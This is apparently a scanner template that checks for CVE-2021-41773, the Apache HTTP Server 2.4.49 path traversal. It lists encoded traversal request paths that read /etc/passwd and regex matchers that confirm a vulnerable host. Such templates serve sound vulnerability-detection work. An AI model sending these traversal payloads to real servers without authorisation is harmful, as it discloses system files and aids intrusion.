id: apache-path-traversal
info:
  name: Apache HTTP Server 2.4.49 Path Traversal
  severity: high
  cve: CVE-2021-41773
  description: Apache HTTP Server 2.4.49 is vulnerable to path traversal. A remote attacker can read arbitrary files via /cgi-bin/.%2e/%2e%2e/
  product: "Apache httpd"
  service: http
  reference: https://nvd.nist.gov/vuln/detail/CVE-2021-41773

requests:
  - method: GET
    path:
      - "/cgi-bin/.%2e/%2e%2e/etc/passwd"
      - "/icons/.%2e/%2e%2e/etc/passwd"
      - "/cgi-bin/.%2e/%2e%2e/etc/passwd%00"
    matchers:
      - type: regex
        pattern:
          - "root:.*:0:0:"
          - "root:.:0:0:.*:"
